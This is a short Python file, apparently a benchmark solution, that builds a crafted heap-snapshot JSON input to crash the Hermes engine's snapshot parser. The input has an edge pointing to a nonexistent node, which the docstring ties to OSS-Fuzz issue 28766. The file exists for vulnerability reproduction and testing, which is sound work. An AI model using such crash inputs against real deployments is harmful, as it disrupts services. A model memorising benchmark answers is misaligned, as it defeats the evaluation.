import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to OSS-Fuzz issue 28766 in Hermes (referenced by arvo:28766).
        It is a stack buffer overflow (or invalid iterator dereference) in the heap snapshot parser.
        The crash occurs when an edge references a node ID that does not exist in the node_id_map.
        The parser fails to check if the iterator returned by find() is valid (end()) before dereferencing it.
        """
        
        # We create a minimal Heap Snapshot JSON.
        # 1. 'node_fields' specifies that we provide 'id' and 'edge_count'.
        # 2. 'edge_fields' specifies that we provide 'to_node'.
        # 3. We define one node with ID 1 and 1 edge.
        # 4. We define that edge pointing to ID 2.
        # 5. ID 2 is not defined in the 'nodes' list.
        # 6. This triggers the missing check in node_id_map lookup.
        
        poc = {
            "snapshot": {
                "meta": {
                    "node_fields": ["id", "edge_count"],
                    "edge_fields": ["to_node"]
                }
            },
            "nodes": [1, 1],
            "edges": [2],
            "strings": []
        }
        
        return json.dumps(poc, separators=(',', ':')).encode('utf-8')